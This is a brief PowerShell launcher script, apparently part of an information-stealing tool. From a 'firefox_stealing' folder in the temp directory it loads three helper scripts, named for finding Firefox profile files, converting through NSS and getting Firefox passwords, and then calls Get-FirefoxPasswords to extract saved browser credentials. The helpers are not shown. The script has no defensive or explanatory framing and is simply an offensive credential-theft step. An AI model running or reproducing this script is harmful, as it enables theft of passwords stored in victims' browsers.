$tempdir = $env:TEMP
. $tempdir\firefox_stealing\Find-FirefoxFiles.ps1
. $tempdir\firefox_stealing\ConvertFrom-NSS.ps1
. $tempdir\firefox_stealing\Get-FirefoxPasswords.ps1

Get-FirefoxPasswords
